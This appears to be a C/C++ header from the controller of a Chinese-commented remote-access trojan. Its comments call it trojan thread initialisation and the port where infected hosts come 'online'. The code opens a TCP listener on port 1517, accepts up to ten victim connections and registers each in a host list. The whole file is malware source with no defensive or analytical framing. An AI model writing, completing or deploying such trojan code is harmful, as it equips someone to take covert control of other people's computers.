#pragma once
#include "MainFunc.h"
#define ListenPort 1517 //上线端口
#define PCNUM 10  //允许最大上线主机数
//木马线程初始化
BOOL TrojanEntry(){
	CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)ListenProc,(LPVOID)ListenPort,NULL,NULL);//上线端口监听
	return TRUE;
}
//上线端口监听
BOOL ListenProc(int port) {
	WSADATA	wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);
	SOCKET	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	SOCKADDR_IN	addr;
	SOCKADDR_IN newAddr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = ADDR_ANY;

	int ret = bind(sockfd, (sockaddr*)&addr, sizeof(addr));
	if (ret == SOCKET_ERROR) return FALSE;
	ret = listen(sockfd, PCNUM);
	if (ret == SOCKET_ERROR)return FALSE;
	while (1) {
		int dwSize = sizeof(SOCKADDR_IN);
		SOCKET newSocket = accept(sockfd, (LPSOCKADDR)&newAddr, &dwSize);
		if (newSocket == INVALID_SOCKET) continue;
		InsertNewItem(newSocket, newAddr);
	}
}